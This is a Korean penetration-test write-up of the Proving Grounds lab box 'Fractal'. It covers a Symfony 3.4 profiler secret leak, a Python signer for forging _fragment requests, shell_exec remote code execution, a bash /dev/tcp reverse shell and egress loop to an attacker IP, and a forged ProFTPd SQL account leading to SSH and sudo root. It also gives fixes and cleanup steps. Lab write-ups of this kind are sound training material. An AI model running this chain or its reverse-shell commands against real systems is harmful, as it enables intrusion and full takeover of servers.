---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/symfony
  - tech/web/info-disclosure
  - tech/web/rce
  - tech/db/mysql
  - tech/svc/proftpd
  - tech/lin/sudo-abuse
type: machine
platform: pg
os: linux
ip: 192.168.248.233
ports: [21, 22, 80]
services: [ftp, http, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 6
---

> [!info] 요약
> 타겟 `192.168.248.233` · Linux(Ubuntu 20.04.5 LTS, 커널 5.4.0-126) · Fundamental · 플래그 2개
> 진입점: `robots.txt` 가 노출한 Symfony 3.4 dev 프론트컨트롤러 `app_dev.php` → 프로파일러 `open?file=app/config/parameters.yml` 에서 app `secret` 회수 → `_fragment` URI 서명 위조 → `shell_exec` 컨트롤러 RCE → 포트 80 리버스셸(www-data)
> 권한상승: ProFTPd `sql.conf` 의 MySQL 자격증명 → `ftpuser` 테이블에 uid 1000 매핑 FTP 계정 삽입 → FTP 로 benoit 홈에 `authorized_keys` 업로드 → SSH(benoit) → `sudo -i`(NOPASSWD: ALL) → root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.233

### Initial Access – 프로덕션에 남은 Symfony dev 프론트컨트롤러가 app secret 을 노출하고, 그 secret 이 `_fragment` 서명 위조 RCE 로 이어짐

**Vulnerability Explanation:** 두 결함이 체인됨.
- 프로덕션 웹루트에 개발 프론트컨트롤러 `app_dev.php` 가 그대로 남아 `_profiler` 라우트가 무인증 노출됨. 프로파일러의 소스 뷰어(`_profiler/open?file=`)로 `app/config/parameters.yml` 을 읽어 앱 `secret` 회수 — 민감정보 노출(information disclosure)
- Symfony `FragmentListener` 는 `/_fragment` 요청으로 임의 PHP 콜러블을 서브리퀘스트 실행하고, 무단 호출은 `_hash`(HMAC-SHA256 URI 서명) 하나로만 막음. secret 을 알면 서명을 로컬에서 계산할 수 있어 검증이 통째로 무력화 = 임의 함수 호출 RCE
- 대상 버전 Symfony 3.4.46. 웹 프로세스는 `www-data`(uid 33)로 구동

**Vulnerability Fix:**
- 프로덕션에서 `app_dev.php` 삭제, 또는 IP 화이트리스트 가드 복원. 같은 웹루트의 `web/config.php` 는 `This script is only accessible from localhost.` 로 가드가 살아 있었으므로 `app_dev.php` 쪽 가드만 빠진 것으로 판단 `[가정]` — `app_dev.php` 소스를 직접 읽지는 않았음
- `secret` 유출 시 즉시 로테이션. 프로파일러 `open?file=` 는 트래버설이 막혀 있어도 프로젝트 루트 아래 설정 파일은 그대로 읽히므로, 가드를 믿지 말고 dev 진입점 자체를 없애는 것이 유일한 차단

**Severity:** Critical — 무인증 원격 RCE

**Steps to reproduce the attack:**
1. `robots.txt` 의 `Disallow: /app_dev.php` 로 dev 진입점 존재 확인
2. `app_dev.php/_profiler/open?file=app/config/parameters.yml` 요청 → `secret` 회수
3. 회수한 secret 으로 `_fragment` URI 의 HMAC-SHA256 서명을 로컬 계산
4. `_path=_controller=shell_exec&cmd=<명령>` 을 이중 인코딩해 서명된 URL 로 전송
5. HTTP 500 응답의 `LogicException` 메시지에서 명령 출력 회수
6. 포트 80 리버스셸로 www-data 대화형 셸 획득

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.233 | TCP: 21, 22, 80 |

3단 스캔. 즉시 구간은 top-1000, 전체 포트와 UDP 는 tmux 백그라운드로 던져놓고 회수.

```bash
nmap --privileged -Pn -n -sCV -p 21,22,80 -oN nmap-quick.txt 192.168.248.233
nmap -sCV -p- -Pn -n -A --min-rate 5000 -oN nmap-full.txt 192.168.248.233
sudo nmap -sU -Pn -n --top-ports 100 --max-retries 1 -T4 -oN nmap-udp-top100.txt 192.168.248.233
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!
| http-robots.txt: 2 disallowed entries 
|_/app_dev.php /app_dev.php/*
```
— 출처: `~/PG/Fractal/nmap-quick.txt`

- 전체 포트(`-p-`) 결과 `Not shown: 64513 closed tcp ports (reset), 1019 filtered tcp ports (no-response)` — **추가 포트 없음**. UDP top-100 은 전부 `open|filtered (no-response)` 로 판정 불가. 21/22/80 이 전부.
- ProFTPd 는 버전 배너를 숨김(`ProFTPD` 만). `ftp-anon`·`ftp-syst`·`ftp-bounce` 스크립트도 전부 무출력(`~/PG/Fractal/svc/ftp-nmap.txt`). 실제 버전은 셸 획득 후 `dpkg` 로 확정 → `proftpd-basic 1.3.6c-2ubuntu0.1`.
- `robots.txt` 가 `# symfony 3.4 robots.txt` 주석과 함께 `/app_dev.php` 를 노출 — **개발 진입점 존재의 1차 근거**.

```text
# symfony 3.4 robots.txt
User-agent: *
Disallow: /app_dev.php
Disallow: /app_dev.php/*
```
— 출처: `~/PG/Fractal/web-80/probe_robots.txt`

**웹 진입점.** 첫 화면은 "Fractals" 정적 페이지(`title=Welcome!`). gobuster 결과 중 의미 있는 것 둘 — `/app.php` 301 → `/`(Symfony 프로덕션 프론트컨트롤러), `/phpmyadmin` 301 → `/phpmyadmin/`. `/server-status` 는 403(`web-80/probe_server-status`). `/phpmyadmin/` 은 실제 로그인 페이지를 냄(`sym/phpmyadmin_.html`) — **배제한 것이 아니라 시도하지 않았음.** 손에 든 `symfony`/`symfony_db_password` 는 앱 DB 계정이고 권한상승에 필요한 것은 별개의 `proftpd` DB 라, RCE 셸에서 `mysql` 클라이언트로 직접 붙는 쪽이 빨랐음.

응답 본문 푸터가 프레임워크를 자기 입으로 밝힘 — `<footer class="mastfoot">` 안에 `Build with Symfony`. `robots.txt` 와 독립된 두 번째 지문임.

```html
      <footer class="mastfoot mt-auto">
        <div class="inner">
          <p>Build with Symfony</p>
        </div>
      </footer>
```
— 출처: `~/PG/Fractal/web-80/root.body` 46–50행

![[PG-Fractal-index.png]]

스크린샷에는 푸터가 없음 — 헤드리스 캡처가 뷰포트 1280×900 이고 본문에 전폭 이미지 3장이 들어가 푸터가 접힘 아래로 밀림. 푸터 근거는 스크린샷이 아니라 `root.body` 응답 본문임.

**Symfony 버전 판정 — 독립 근거 2개 교차:**
- `robots.txt` 1행 주석 `# symfony 3.4 robots.txt` (출처: `web-80/probe_robots.txt`)
- 프로파일러 Configuration 패널의 `Symfony version` = **3.4.46** (출처: `sym/app_dev.php__profiler_latest_panel_config.html`)

### Initial Access – 프로파일러 secret → `_fragment` RCE

**dev 프론트컨트롤러가 왜 취약한가.** Symfony 는 프론트컨트롤러가 둘 — `app.php`(prod)와 `app_dev.php`(dev). dev 는 `APP_DEBUG=1` 로 웹 프로파일러를 켜고 `_profiler` 라우트를 붙임. 배포 시 `app_dev.php` 를 지우거나 IP 화이트리스트를 걸어야 하는데 그대로 노출됨.

배치 프로빙으로 노출 경로 확정:

```text
43503  app_dev.php                              ← dev 프론트, 디버그 툴바
97468  app_dev.php/_profiler/latest
82451  app_dev.php/_profiler/phpinfo
13958  app_dev.php/_profiler/open?file=app/config/config.yml
 6922  app_dev.php/_profiler/open?file=app/config/parameters.yml   ← secret 회수
  471  _profiler          → 404 Not Found       ← prod 경로에는 없음
  471  _profiler/latest   → 404 Not Found
```
— 출처: `~/PG/Fractal/sym/` (바이트 수는 회수한 응답 본문 크기)

404 두 건은 본문이 Symfony 기본 오류 페이지 `The server returned a "404 Not Found"` 임을 눈으로 확인. 프로파일러 라우트는 `app_dev.php` **뒤에** 붙음 — `app_dev.php/_profiler/...` 여야 열림.

`_profiler/open?file=` 는 프로파일러가 소스 뷰어로 노출하는 엔드포인트. **임의 파일 열람은 아님** — Symfony 3.4 `ProfilerController::openAction` 이 `$this->baseDir`(프로젝트 루트)를 앞에 붙이고 `preg_match("'(^|[/\\\\])\.'", $file)` 로 **점으로 시작하는 경로 세그먼트를 전부 거부**함. 즉 `../` 트래버설도 `.env` 류 숨김파일도 막히고, **프로젝트 루트 아래 일반 파일만** 읽힘.

그 범위 안에 `app/config/parameters.yml` 이 들어 있는 것이 이 박스의 사고. (근거: symfony/symfony 3.4 브랜치 `ProfilerController.php` 원문. 이 박스에서 트래버설을 실제로 시도하지는 않았음.)

`parameters.yml` 을 그대로 읽어냄:

```text
# This file is auto-generated during the composer install
parameters:
    database_host: 127.0.0.1
    database_port: 3306
    database_name: symfony
    database_user: symfony
    database_password: symfony_db_password
    mailer_transport: smtp
    mailer_host: 127.0.0.1
    mailer_user: null
    mailer_password: null
    secret: 48a8538e6260789558f0dfe29861c05b
```
— 출처: `~/PG/Fractal/sym/app_dev.php__profiler_open_file_app_config_parameters.yml.html`

![[PG-Fractal-profiler-parameters.png]]

여기 `secret` 이 RCE 의 열쇠. `database_*` 는 Symfony 앱용 MySQL 이고, **권한상승에 쓴 DB 는 별개의 ProFTPd DB** — `Privilege Escalation` 절에서 구분함.

**왜 이 페이로드인가 — `_fragment` + `UriSigner`.** `FragmentListener` 는 `/_fragment` 요청을 받아 지정한 컨트롤러(임의 PHP 콜러블 포함)를 서브리퀘스트로 실행. 무단 실행을 막으려고 `_hash` 파라미터로 URI 서명을 검증. 서명 알고리즘(`HttpKernel\UriSigner`, Symfony 3.4):

```text
hash = base64_encode( hash_hmac('sha256', $uri, $secret, true) )
```

`$uri` = 스킴+호스트+경로+정렬된 쿼리스트링(`_hash` 제외). secret 을 알면 **로컬에서 유효한 서명을 계산**할 수 있음.

서명기 스크립트:

```python
import sys, hmac, hashlib, base64
from urllib.parse import quote

SECRET = "48a8538e6260789558f0dfe29861c05b"
BASE   = "http://192.168.248.233/app_dev.php/_fragment"

def sign(path_value, secret=SECRET, base=BASE):
    # 파라미터가 _path 하나뿐이라 ksort 결과도 동일
    q = "_path=" + quote(path_value, safe="")   # PHP rawurlencode 와 동치(unreserved: A-Za-z0-9-._~)
    uri = base + "?" + q
    h = base64.b64encode(hmac.new(secret.encode(), uri.encode(), hashlib.sha256).digest()).decode()
    return uri + "&_hash=" + quote(h, safe="")
```
— 출처: `~/PG/Fractal/sign_fragment.py` (발췌 — 파일 상단 주석과 `__main__` 블록 생략, 나머지는 원문 그대로)

`_path` 는 프래그먼트가 `parse_str` 로 다시 파싱하는 내부 쿼리. `_controller=<함수>&<인자>...` 형태. 그래서 인자는 **두 번 인코딩**됨 — 안쪽은 `_path` 내부 파라미터 구분(`&`,`=`)을 살리려고, 바깥쪽은 `_path` 값 전체를 rawurlencode.

**수동 대안(자동 도구 없이).** 서명 계산은 python 3표준 라이브러리(`hmac`·`hashlib`·`base64`)만 쓰고 전송은 `curl` 하나. PHP 로 하면 `base64_encode(hash_hmac('sha256',$uri,$secret,true))` 한 줄로 동치. sqlmap·자동 스캐너는 애초에 이 경로에 개입할 여지가 없음.

**컨트롤러 후보를 배치로 발사.** 전부 500 이 돌아옴. 판정은 상태코드가 아니라 **예외 클래스**로 함:

| `_controller` | 예외 | 읽는 법 |
|---|---|---|
| `system&command=id` | `RuntimeException` — `Controller "system" requires that you provide a value for the "$return_value" argument.` | ArgumentResolver 가 2번째 인자를 못 채움 |
| `passthru&command=id` | 동일 (`$return_value`) | 같은 이유 |
| `exec&cmd=id` | `RuntimeException` — `"$output" argument` | 같은 이유 |
| `system` + 2번째 인자 채워 재시도 | `ContextErrorException` — `Warning: Parameter 2 to system() expected to be a reference, value given` | 참조 인자라 값 전달 불가 |
| `shell_exec&cmd=id` | **`LogicException` — `The controller must return a response (uid=33(www-data) gid=33(www-data) groups=33(www-data) given).`** | **명령 출력이 예외 메시지에 실려 나옴** |

— 출처: `~/PG/Fractal/frag/` (응답 14개 전량 보존)

즉 성공 신호가 200 이 아니라 **500 안에 박힌 문자열**임. `shell_exec` 는 인자가 하나뿐이라 ArgumentResolver 를 통과하고, 반환한 문자열이 Response 가 아니라서 HttpKernel 이 `LogicException` 을 던지는데 **그 메시지에 명령 출력이 그대로 들어감.** dev 모드 디버그 예외 페이지가 그것을 렌더 → 출력 회수 가능. `system`/`passthru`/`exec` 는 2번째 인자가 참조라 프래그먼트 인자 전달과 맞지 않아 포기.

성공 응답에서 뽑아낸 `id` + `uname -a`:

```text
The controller must return a response (uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux fractal 5.4.0-126-generic #142-Ubuntu SMP Fri Aug 26 12:12:57 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 given). (500 Internal Server Error)
```
— 출처: `~/PG/Fractal/frag/idtest.html` (HTML 태그 제거 후)

RCE 래퍼는 `~/PG/Fractal/rce.py` — `sign_fragment.sign()` 에 `_controller=shell_exec&cmd=<이중 인코딩된 명령>` 을 넘겨 `curl` 로 쏘고 응답을 그대로 출력.

**리버스셸 — 443 먼저 쐈고 안 붙음**(`frag/revshell443.html` 0바이트, 10:06:51). 그 다음에야 아웃바운드 egress 를 배치로 점검:

```bash
for p in 443 80 53 8080 4444; do timeout 3 bash -c "echo OUT$p > /dev/tcp/192.168.45.207/$p"; done
```

응답은 `frag/egress_test.html` = `done`. 루프 자체는 `rce.py` 인자로 넘긴 것이라 원문이 파일로 남아 있지는 않음.

`tcpdump -i tun0` + 포트별 리스너로 **80·53 도착, 443 미도착**을 관측했으나 **그 화면은 파일로 미보존** — 산출물로 확정되는 것은 **80 뿐**임(`harvest_root.txt` 프로세스 목록에 `bash -c bash -i >& /dev/tcp/192.168.45.207/80 0>&1` 가 살아 있음). 53 도착·443 미도착은 `[가정]`. 443 차단 여부도 `[가정]` — tun0 캡처는 성공 회선만 보이므로 "시도했는데 막혔다"와 "안 나갔다"를 구분 못 함.

포트 80 으로 리버스셸:

```bash
bash -c "bash -i >& /dev/tcp/192.168.45.207/80 0>&1" &
```

타겟 pty(출처: tmux `fr-shell` capture-pane):

```text
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.233] 60850
www-data@fractal:/var/www/html/web$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**세션은 정리 단계에서 `tmux kill-session` 으로 종료돼 캡처 원문이 파일로 남아 있지 않음.** 이 셸이 실재했다는 산출물 근거는 `harvest_root.txt` 의 프로세스 목록 — `www-data` 소유 `bash -c bash -i >& /dev/tcp/192.168.45.207/80 0>&1` 와 그 자식 `bash -i` 가 그대로 잡힘.

**Local.txt value:** `f62124f1ae5f1ab510a1a4a5de5bf0d5`

`local.txt` 는 `-r--r--r-- 1 benoit benoit 33` 라 www-data 도 읽을 수 있었음(출처: `harvest_root.txt` FLAGS 절). 그러나 **한 화면 증거는 benoit 대화형 SSH 세션에서 회수** — 웹셸/비대화형 RCE 로 읽은 플래그는 시험 0점이라 대화형 셸에서 다시 읽어야 함. 그 `whoami; id; hostname; …; cat` 한 화면 출력은 아래 `Privilege Escalation` → **`www-data → benoit`** 절 끝의 `proof_user.txt` 블록에 있음.

### Privilege Escalation – ProFTPd DB 계정 위조(www-data → benoit) 후 `sudo NOPASSWD: ALL`(benoit → root)

**Vulnerability Explanation:** 두 단계, 두 결함.
- ProFTPd 가 `mod_sql_mysql` 로 가상 사용자를 인증하는데, 설정 파일 `/etc/proftpd/sql.conf` 가 www-data 읽기 가능이고 DB 자격증명이 평문으로 들어 있음. 그 계정이 인증 테이블 `ftpuser` 에 **`INSERT` 권한**까지 가짐 — 인증 저장소에 쓸 수 있으면 임의 `uid`/`homedir` 계정을 만들 수 있고, FTP 세션이 그 uid 권한으로 돌아 소유자만 쓰던 홈에 파일을 심는 우회가 성립
- benoit 이 `sudo` 를 **비밀번호 없이 전 명령**(`NOPASSWD: ALL`) 실행 가능 — 사용자 셸 획득이 곧 root

**Vulnerability Fix:**
- ProFTPd 연동 DB 계정(`proftpd`)에 `INSERT`/`UPDATE` 권한을 주지 말 것 — 인증 조회는 `SELECT` 로 충분. 쓰기 권한이 임의 uid 계정 생성으로 직결
- `sql.conf` 를 웹 프로세스(www-data)가 읽지 못하게 퍼미션 제한. DB 비밀번호는 설정 파일 평문 대신 제한된 권한의 별도 자격증명으로
- benoit 의 `NOPASSWD: ALL` 제거 — 필요한 명령만 화이트리스트로 한정

**Severity:** Critical — 서비스 계정에서 root 까지 완전 장악

**Steps to reproduce the attack:**
1. www-data 셸에서 `/etc/proftpd/sql.conf` 읽어 `SQLConnectInfo` 의 DB 자격증명 회수
2. `mysql` 클라이언트로 `proftpd` DB 접속 → `ftpuser` 테이블 스키마·기존 행 확인
3. `uid=1000`·`homedir=/home/benoit` 인 FTP 계정 행을 `INSERT`
4. `lftp` 로 그 계정 로그인 → `/home/benoit/.ssh/authorized_keys` 업로드
5. SSH 로 benoit 대화형 로그인 → `local.txt`
6. `sudo -i` → root

#### www-data → benoit (ProFTPd DB 계정 위조)

셸 즉시 `harvest.sh` 실행. 일반 사용자는 benoit 하나. 홈은 `drwxr-xr-x 2 benoit benoit` 라 www-data 는 **읽기는 되고 쓰기는 안 됨**:

```text
drwxr-xr-x  3 root   root   4096 Sep 27  2022 .
drwxr-xr-x 20 root   root   4096 Jan  7  2021 ..
drwxr-xr-x  2 benoit benoit 4096 Sep 27  2022 benoit
B2
root:x:0:0:root:/root:/bin/bash
benoit:x:1000:1000::/home/benoit:/bin/sh
```
— 출처: `~/PG/Fractal/frag/enum1.html` (HTML 태그 제거 후)

www-data 열거는 셸이 아니라 **비대화형 RCE(`rce.py`)** 로 돌려 안정 회수함.

ProFTPd 설정에서 DB 연동 자격증명:

```text
SQLBackend mysql
SQLAuthTypes OpenSSL Crypt
SQLConnectInfo proftpd@localhost proftpd protfpd_with_MYSQL_password
SQLUserInfo ftpuser userid passwd uid gid homedir shell
SQLMinID 33
```
— 출처: `~/PG/Fractal/frag/enum1.html` → `/etc/proftpd/sql.conf` (발췌 — 주석행과 `SQLAuthenticate`·`SQLGroupInfo` 생략, 값·순서는 원문 그대로)

`ftpuser` 테이블 = ProFTPd 의 가상 사용자 저장소. 각 행이 `uid/gid/homedir` 를 지정 → FTP 세션은 **그 uid 권한으로** 파일시스템에 접근. 기존 행은 `www`(uid 33)뿐:

```text
userid	passwd	uid	gid	homedir	shell
www	{md5}RDLDFEKYiwjDGYuwpgb7Cw==	33	33	/var/www/html	/sbin/nologin
```
— 출처: `~/PG/Fractal/frag/db1.html` (HTML 태그 제거 후)

benoit 홈은 www-data 가 못 쓰지만, **uid 1000 으로 매핑된 FTP 계정을 만들면** FTP 세션이 benoit 권한을 얻어 홈에 쓸 수 있음. 계정 삽입:

```sql
INSERT INTO ftpuser (userid,passwd,uid,gid,homedir,shell)
VALUES ('hacker','{md5}xKZnXxuuNbTj2DiMKnfv2A==',1000,1000,'/home/benoit','/bin/bash');
```
— 이 `INSERT` 문 자체는 `rce.py` 인자로 넘긴 것이라 **원문이 파일로 남아 있지 않음.** 삽입된 값은 아래 `db_insert.html` 결과 행으로 확정됨.

`passwd` 는 `SQLAuthTypes OpenSSL` 형식 — `{md5}` 접두사 + `base64(md5_raw(password))`. `ftppass123` 을 그 형식으로:

```bash
printf '%s' 'ftppass123' | openssl dgst -binary -md5 | openssl base64
```

출력은 `xKZnXxuuNbTj2DiMKnfv2A==` 이고 `{md5}` 접두사는 ProFTPd 저장 형식이라 손으로 붙임.

삽입 직후 같은 요청에서 테이블을 다시 읽어 확인:

```text
INS_DONE
userid	uid	gid	homedir	shell
www	33	33	/var/www/html	/sbin/nologin
hacker	1000	1000	/home/benoit	/bin/bash
```
— 출처: `~/PG/Fractal/frag/db_insert.html` (HTML 태그 제거 후)

benoit 홈에 SSH 키 업로드(FTP 세션이 uid 1000 이라 `.ssh` 생성·쓰기 가능):

```bash
#!/bin/bash
mkdir -p sshdir && cp benoit_key.pub sshdir/authorized_keys
cd sshdir
lftp -u hacker,ftppass123 192.168.248.233 <<LFTP 2>&1
set ssl:verify-certificate no
set ftp:ssl-allow no
mkdir .ssh
cd .ssh
put authorized_keys
chmod 600 authorized_keys
ls -la
bye
LFTP
```
— 출처: `~/PG/Fractal/ftp_upload.sh`

`set ftp:ssl-allow no` 는 lftp 가 AUTH TLS 를 시도하다 인증서에서 걸리는 것을 막으려고 붙인 것. **이 박스에서 빼고 시도해 본 적은 없음** — 필수였는지는 관측 없음.

업로드 성공은 정리 단계에서 역으로 확인됨 — 정리 직전 `ls -la /home/benoit/.ssh` 가 `-rw-r--r-- 1 benoit benoit 91 Aug 21 01:14 authorized_keys` 를 보여줌(출처: `cleanup.txt`). 91바이트는 `benoit_key.pub` 크기와 일치. **FTP 세션 로그 자체는 파일로 미보존.**

SSH 로 benoit 접속(대화형 pty 셸 — 웹셸 아님):

```text
$ whoami; id; hostname; hostname -I; date; cat /home/benoit/local.txt
benoit
uid=1000(benoit) gid=1000(benoit) groups=1000(benoit)
fractal
192.168.248.233
Fri 21 Aug 2026 01:15:21 AM UTC
f62124f1ae5f1ab510a1a4a5de5bf0d5
```
— 출처: `~/PG/Fractal/proof_user.txt`

**프롬프트가 `$` 하나뿐인 것은 benoit 의 로그인 셸이 `/bin/sh`(dash) 라서** — 호스트명이 안 붙는다고 웹셸이 아님. 대화형 pty 였다는 근거는 `harvest_root.txt` 프로세스 트리:

```text
root       76986  0.0  0.5  13800  5056 ?        Ss   01:15   0:00  \_ sshd: benoit [priv]
benoit     77100  0.0  0.3  13932  3360 ?        S    01:15   0:00      \_ sshd: benoit@pts/3
benoit     77102  0.0  0.1   2608  1828 pts/3    Ss   01:15   0:00          \_ -sh
root       88520  0.0  0.3   9260  3460 pts/3    S    01:16   0:00              \_ sudo -i
root       88521  0.0  0.3   8276  3944 pts/3    S    01:16   0:00                  \_ -bash
```
— 출처: `~/PG/Fractal/harvest_root.txt` 434–438행

#### benoit → root (`sudo NOPASSWD: ALL`)

셸 잡자마자 5종 열거. `sudo -l` 이 즉시 끝냄 — benoit 는 **비밀번호 없이 전 명령** 실행 가능.

`[가정]` benoit 의 `sudo -l` 출력 원문(`(ALL) NOPASSWD: ALL` 형태)은 SSH 세션 스크롤백에만 있었고 **파일로 미보존**. 산출물로 확정되는 것은 `Post-Exploitation` 절의 `proof_root.txt` — `sudo -i` 가 **비밀번호 프롬프트 없이** 곧바로 root pty 를 내준 것이 NOPASSWD 의 실측 증거임. (`harvest_root.txt` 의 SUDO 절은 root 로 실행한 것이라 root 자신의 `sudo -l` 이고, benoit 것이 아님.)

다른 경로는 없음(출처: `harvest_root.txt` SUID/CAPS/CRON 절):

- **SUID** — snap 스냅샷(core18·core20·snapd) 사본과 Ubuntu 20.04 기본 집합(`sudo`·`pkexec`·`su`·`mount`·`umount`·`passwd`·`chfn`·`chsh`·`gpasswd`·`newgrp`·`fusermount`·`at`·`dmcrypt-get-device`·`snap-confine`·`ssh-keysign`·`dbus-daemon-launch-helper`·`polkit-agent-helper-1`) 뿐. 비표준 SUID 없음
- **getcap** — `/usr/bin/ping`·`/snap/core20/1623/usr/bin/ping`·`/usr/bin/traceroute6.iputils`·`/usr/bin/mtr-packet` 이 `cap_net_raw+ep`, `gst-ptp-helper` 가 `cap_net_bind_service,cap_net_admin+ep`. 전부 배포판 기본이고 파일 읽기·실행 권한으로 이어지는 것 없음
- **cron** — `no crontab for root`

`pkexec` 는 설치돼 있으나 **PwnKit(CVE-2021-4034) 대상이 아님.** 이 호스트의 `policykit-1` 은 `0.105-26ubuntu1.3` 인데, Ubuntu 20.04 의 PwnKit 수정판이 `0.105-26ubuntu1.2`(USN-5252-1)라 이미 그보다 뒤 버전임. (근거: `harvest_root.txt` `dpkg -l` 1120행, Ubuntu 보안 공지 USN-5252-1 원문.)

### Post-Exploitation

**Proof.txt value:** `3fccb8b2b4eb6870d248850dbd7994ea`

```text
$ sudo -i
root@fractal:~# whoami; id; hostname; hostname -I; date; cat /root/proof.txt
root
uid=0(root) gid=0(root) groups=0(root)
fractal
192.168.248.233
Fri 21 Aug 2026 01:16:13 AM UTC
3fccb8b2b4eb6870d248850dbd7994ea
root@fractal:~#
```
— 출처: `~/PG/Fractal/proof_root.txt`

두 플래그 모두 **같은 대화형 SSH pty 세션**에서 회수. user(`01:15:21 UTC`) → `sudo -i` → root(`01:16:13 UTC`) 순서. 앞의 `$` 는 benoit dash 프롬프트와 같은 셸이고, 그 셸이 `sudo -i` 로 `root@fractal:~#` 가 된 것이 한 파일에 이어져 있어 **웹셸이 아님이 파일 하나로 증명**됨.

⚠️ 두 `proof_*.txt` 의 **파일 mtime 은 root 쪽이 먼저**(10:16) user 쪽이 나중(10:18)임. 본문 `date` 가 UTC 라 KST 로 환산하면 user 10:15:21 → root 10:16:13 으로 서사와 일치 — user 파일을 나중에 스크롤백에서 옮겨 적었을 뿐임. mtime 만 보고 순서를 뒤집어 읽지 말 것.

**남긴 흔적** — 작업 전후 대조(출처: `~/PG/Fractal/cleanup.txt`):

- **`ftpuser` 테이블에 `hacker` 행 삽입**(uid/gid 1000, homedir `/home/benoit`) — 이 박스에서 심은 것 중 유일한 영속 계정. 삭제 후 `SELECT` 로 `www` 만 남음 확인
- **`/home/benoit/.ssh/authorized_keys` 업로드** — 원래 없던 디렉터리(작업 중 생성). `.ssh` 통째로 삭제 후 `ls` 로 부재 확인
- **웹루트 임시 파일**(`/var/www/html/web/h.txt`,`h2.txt`) 삭제 확인
- **`/tmp/.h*`**(harvest 스크립트·출력) 삭제 확인
- **Kali 리스너·tmux**: `fr-shell`/`fr-http`/`fr-tcpd`/`fr-benoit` 및 recon 세션 전부 `tmux kill-session` 으로 이름 지정 종료, `ss -lntp` 로 80/443/53 리스너 부재 확인
- 타겟 마운트 생성 없음

```text
--before-db
+--------+------+
| userid | uid  |
+--------+------+
| www    |   33 |
| hacker | 1000 |
+--------+------+
--deleting
--after-db
+--------+-----+
| userid | uid |
+--------+-----+
| www    |  33 |
+--------+-----+
```
— 출처: `~/PG/Fractal/cleanup.txt`

## 관련

- Symfony `UriSigner` (HttpKernel) — `_fragment` 서명 검증 로직
- Symfony `ProfilerController::openAction` — `_profiler/open?file=` 의 경로 가드
- ProFTPd `mod_sql` / `mod_sql_mysql` — SQL 기반 가상 사용자 인증
- GTFOBins `sudo` — `sudo -i`
- 성공 회선 80: [[Wombo]] · [[Bratarina]]
- 저장소 이원화 의심: [[Wheels]]

**시행착오 — `_PLAYBOOK` 증상별 진입:**

- [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] — `_fragment` 는 성공해도 500
- [[_PLAYBOOK#A-21. 웹 진입점에서 더 나갈 곳이 없다]] — prod 경로 `_profiler` 헛발, `config.php` 로컬 가드
- [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] — 443 미도착 → 80
- [[_PLAYBOOK#A-33. 셸을 내 손으로 죽였다 — 인터랙티브 프롬프트와 `pkill -f`]] — `harvest.sh` 前景 블로킹, `sudo` 프롬프트에 `C-c`
- [[_PLAYBOOK#B-17. Symfony dev 프론트컨트롤러 → `_fragment` 서명 위조 RCE]]
- [[_PLAYBOOK#B-21. ProFTPd + mod_sql_mysql — 계정이 DB 행 하나다]]

- [[_STATUS]] · [[_PLAYBOOK]]
